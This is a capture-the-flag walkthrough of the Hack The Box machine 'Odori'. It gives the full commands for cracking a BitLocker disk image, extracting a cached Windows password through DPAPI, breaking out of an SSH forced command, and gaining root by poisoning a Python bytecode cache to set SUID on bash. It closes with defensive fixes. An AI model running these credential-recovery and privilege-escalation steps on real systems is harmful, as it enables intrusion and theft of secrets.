# Odori (HTB, Medium, Linux)

Odori is one of those boxes that barely touches the network. You get three ports, an anonymous SMB share, and then it hands you a disk image and basically says "the rest is forensics." I went in expecting to attack a live service and instead spent the first hour cracking BitLocker and walking a DPAPI chain by hand. The foothold is Windows credential recovery done entirely offline on Linux, and root is a lovely little Python bytecode-cache trick. Here's how it went.

## Recon

Nmap gave me almost nothing to work with:

```bash
nmap -p 22,139,445 --min-rate=1000 -sC -sV <target>
```

SSH on 22, Samba on 139 and 445, and that's it. No web server, no sprawling surface. When a box is this bare and SMB allows anonymous access, that's the whole hint: the path starts in the share.

```bash
smbclient -L //<target> -N
smbclient //<target>/backup -N
```

The `backup` share had exactly one file, `info.txt`, and all it said was to download a `.vmdk` linked in the machine description. So the disk image isn't served over the network at all (it would be absurd to push a multi-gig image over SMB); you grab it from the platform page. SMB just points you at it.

## Getting into the disk image

The `.vmdk` is a VMware virtual disk, and my first instinct was to import it into a VM and boot it. That doesn't work, because the volume is BitLocker encrypted. So the actual job is to treat the image as a blob to carve secrets out of, not an OS to run, and everything happens on Linux.

First, pull the BitLocker hash out of the image:

```bash
bitlocker2john -i file02.vmdk | tee hash
```

This spat out four lines, which threw me for a second until I read the labels. They come in two pairs: a user-password protector and a recovery-password protector, each in a fast variant and a MAC-verified variant. You only care about the user password one (`$bitlocker$0$`). The recovery password is a 48-digit random key by design, so throwing a wordlist at it is pointless; a human-chosen password is exactly what rockyou is for.

```bash
grep '^\$bitlocker\$0\$' hash > hash.user
john --format=bitlocker hash.user --wordlist=/usr/share/wordlists/rockyou.txt
```

It fell over almost instantly. The reason this works at all is worth sitting with: BitLocker is normally sealed to the TPM, which makes offline cracking hopeless. This image was encrypted on a system without a TPM, so the only thing standing between you and the volume is a password. No TPM, no hardware root of trust, and it degrades to a guessing game that a wordlist wins.

Now mount it. A `.vmdk` has its own partition table, so you can't point dislocker straight at the file; you expose it as a block device first.

```bash
sudo apt install -y dislocker qemu-utils
sudo modprobe nbd
sudo qemu-nbd --connect=/dev/nbd0 --read-only file02.vmdk
sudo fdisk -l /dev/nbd0
```

Here's a spot where blindly following a writeup bites you. A lot of guides say partition 2; on my instance the BitLocker volume was partition 3, the big "Microsoft basic data" one. The small partitions (EFI, Microsoft reserved, recovery) are noise. Always read the partition table yourself.

```bash
sudo mkdir -p /mnt/bitlocker /mnt/odori
sudo dislocker -r -V /dev/nbd0p3 -u<password> -- /mnt/bitlocker
sudo mount -r -o loop /mnt/bitlocker/dislocker-file /mnt/odori
```

Two things that cost me a minute each. There's no space after `-u` in the dislocker command. And because dislocker runs under sudo, its FUSE mount belongs to root, so listing it as your normal user gives "Permission denied" even though the decryption worked fine. Easiest fix is to just do the whole looting phase as root (`sudo -i`).

The mental model for the layering: qemu-nbd exposes the partitions, dislocker decrypts the volume into a virtual `dislocker-file`, and you loop-mount that file to actually browse the NTFS filesystem.

## The clue that explains everything

Once it mounted, I went straight for the backup script:

```bash
sudo cat /mnt/odori/Scripts/backup.ps1
```

It referenced a service account, `svc_backup`, that authenticates over SFTP on port 22 with a password. The catch: the password in the script is scrubbed to `***`. So the script gives you the motive (this account has a reusable credential for the live box) but withholds the secret.

That's the whole reason DPAPI comes next. This backup clearly ran as a scheduled task, and Windows caches scheduled-task credentials via DPAPI, encrypted, under the account's profile. Scrubbing the password out of the script was pointless because the same password was cached elsewhere on the same disk. Good instinct by whoever built it, useless in practice.

## Recovering the password with DPAPI (the fun part)

DPAPI protects secrets in a chain: a machine or user key decrypts a master key, and the master key decrypts the individual credential blobs. To walk it offline you need all the links, which is why you grab the registry hives and the key material off the mounted image.

```bash
mkdir -p ~/odori/loot && cd ~/odori/loot
sudo cp /mnt/odori/Windows/System32/config/{SAM,SYSTEM,SECURITY} .
sudo cp -r /mnt/odori/Windows/System32/Microsoft/Protect/S-1-5-18/ ./Protect
sudo cp -r /mnt/odori/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials/ ./Credentials
sudo chown -R $USER:$USER *
```

SYSTEM carries the boot key, SAM has the local hashes (svc_backup's NT hash is here, but it won't crack, which is exactly why you're taking the DPAPI route instead), and SECURITY holds the LSA secret that sits at the bottom of the chain.

```bash
pypykatz registry --sam SAM --security SECURITY SYSTEM
```

Rather than guess which master key a blob needs, read the blob's header first. Running the credential parser with no key just prints metadata:

```bash
impacket-dpapi credential -file Credentials/<blob>
```

This told me the blob wanted master key GUID `BB3025A7-...`, and it was flagged `CRYPTPROTECT_SYSTEM`. This is where I burned some time. I had two master keys sitting directly under `Protect/S-1-5-18/`, tried both, and got `ERROR: Padding is incorrect` on each. That error is DPAPI's way of saying "wrong key," the decryption runs but produces garbage and the padding check fails. The blob's GUID is authoritative, so I went looking for that exact filename:

```bash
find Protect/ -type f
```

It was in the `User/` subfolder, not the machine store. Turns out SYSTEM keeps two DPAPI stores, a machine one and a "SYSTEM as a user" one, and this credential was sealed with the user-store key. The flag tells you the context, the GUID tells you the actual key, and the GUID wins.

With the right key file, decrypt the master key, then the blob:

```bash
impacket-dpapi masterkey -file Protect/User/bb3025a7-... -system SYSTEM -security SECURITY
impacket-dpapi credential -file Credentials/<blob> -key 0x<decrypted-master-key>
```

Out popped the credential, and the target field confirmed the whole theory: it was a Task Scheduler batch credential for `svc_backup`. The plaintext password that the script had hidden was right there. Taking the all-Linux route instead of booting the disk and running mimikatz meant I actually did each hop myself, which is the point.

## Foothold, and two different hangs

With the password in hand, SSH in. Except it hung before even asking for a password. Running with `-vvv` showed it freezing at `expecting SSH2_MSG_KEX_ECDH_REPLY` after negotiating `sntrup761x25519-sha512`. That's the post-quantum key exchange, whose large packets fragment and die over the lab VPN's MTU. Forcing a classical algorithm fixes it instantly:

```bash
ssh -oKexAlgorithms=curve25519-sha256 svc_backup@<target>
```

Now it got to the password, accepted it, and hung again, this time with no prompt. Completely different cause. This one is a forced-command restriction in the SSH config:

```
Match group svc_backup
    ForceCommand /opt/restrict /home/%u
    AllowTcpForwarding no
```

`ForceCommand` throws away whatever you ask to run and runs `/opt/restrict` instead, which launches an sftp-server. From an interactive terminal that just sits there silently. So the account works, it's just nailed to one command.

The escape is almost too easy once you look at the permissions: `/opt/restrict` is owned by and writable by `svc_backup`, yet sshd runs it on every login. The jail hands the prisoner the key. So I connected over SFTP (the channel that actually works), confirmed the config and the writable script for myself, and overwrote `/opt/restrict` with something that spawns a shell:

```bash
sftp -oKexAlgorithms=curve25519-sha256 svc_backup@<target>
# grab /etc/ssh/sshd_config and /opt/restrict to confirm, then:
# locally make restrict contain:  #!/bin/bash \n bash
sftp> cd /opt
sftp> put restrict
```

Log back in over SSH, ForceCommand runs my version, and I land in a real shell. Stabilize it with the usual `python3 -c 'import pty;pty.spawn("/bin/bash")'` and grab the user flag.

## Root: poisoning a Python bytecode cache

Enumeration as svc_backup was quick. No sudo, no interesting groups, and `/etc/crontab` had only the stock entries. But `/` had a `/backup` directory I could write to and a root-owned `/archive`, which smells like a root process moving files between them. Since the job wasn't in crontab, it's either a systemd timer or root's private crontab, so pspy would catch it in the act. (My pspy transfer 404'd a couple of times because I was serving from the wrong directory, and the usual gotcha applies: use `-O` uppercase on wget for the output filename, not `-o`.)

I didn't even need pspy to understand the vector, though, because `/opt` was readable:

```bash
ls -la /opt/archiver /opt/archiver/__pycache__
```

```
-rw-r--r-- root  app.py          read-only to me
-rw-r--r-- root  helper.py       read-only to me
drwxr-xrwx root  __pycache__     world-writable
```

There it is. The two source files are locked down, but `__pycache__` is world-writable. `app.py` imports `helper`, scans `/backup`, and for files older than three years it calls a function in `helper` that runs `subprocess.Popen(["/usr/bin/tar", ...])`. Root runs `app.py` on a timer.

The trick is that Python executes the compiled bytecode cache in `__pycache__`, and I can write there even though I can't touch the source. So I edited the cached `.pyc` to point its tar call at a path I control. The neat detail is that `/usr/bin/tar` and `/tmp/bin/tar` are both twelve characters, so an in-place string swap doesn't shift any byte offsets and the bytecode stays valid. Editing only the string in the body also leaves the cache header intact, so Python trusts it instead of recompiling from source.

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc
strings /opt/archiver/__pycache__/helper.cpython-310.pyc | grep tar   # confirm the swap
```

Then plant the fake tar that root will run, and drop a file into `/backup` old enough to trip the three-year archive threshold (a fresh file gets skipped, which is easy to forget):

```bash
mkdir -p /tmp/bin
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/bin/tar
chmod +x /tmp/bin/tar
touch -d '2015-01-01' /backup/trigger
```

Wait a minute or two for the timer, watch `/bin/bash` flip to `-rwsr-xr-x`, and the trigger file disappears (consumed by the job, which is independent proof the whole thing fired). Then cash it in:

```bash
/bin/bash -p
id       # euid=0
cat /root/root.txt
```

The `-p` matters, because bash normally drops elevated privileges on startup; `-p` keeps them so the SUID bit actually sticks.

## The thread running through the whole box

Every stage is the same shape: something you can write, consumed by something more privileged. The BitLocker volume was crackable because there was no TPM. `/opt/restrict` was writable by the user whose login runs it. `__pycache__` was writable by anyone, and root's Python runs its contents. Once you see the pattern, it stops looking like three unrelated tricks (a disk box, an SSH box, a Python box) and starts looking like one idea wearing three costumes.

## Fixes

- Don't use BitLocker without a TPM if the image can leak; it collapses to a wordlist-crackable password.
- Scrubbing a secret from a script does nothing if DPAPI cached the same secret on the same disk. Rotate it and clear the credential store.
- A ForceCommand wrapper must not be writable by the user it restricts. Root-owned, 0755.
- Protecting `.py` source while leaving `__pycache__` world-writable is pointless, since Python trusts the cache. Lock the directory, and ideally don't run user-reachable code as root on a timer at all.
